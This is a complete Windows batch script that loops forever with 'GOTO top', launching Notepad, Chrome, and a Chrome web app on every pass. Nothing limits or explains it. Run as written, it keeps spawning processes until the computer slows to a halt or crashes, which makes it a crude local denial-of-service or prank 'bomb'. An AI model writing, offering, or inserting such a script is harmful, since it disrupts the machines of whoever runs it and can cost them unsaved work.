@ECHO off
 :top
 START %SystemRoot%\system32\notepad.exe
 START "C:\Program Files\Google\Chrome\Application\chrome.exe"
 START "C:\Program Files\Google\Chrome\Application\chrome_proxy.exe" --profile-directory="Profile 1" --app-id=pjibgclleladliembfgfagdaldikeohf
 GOTO top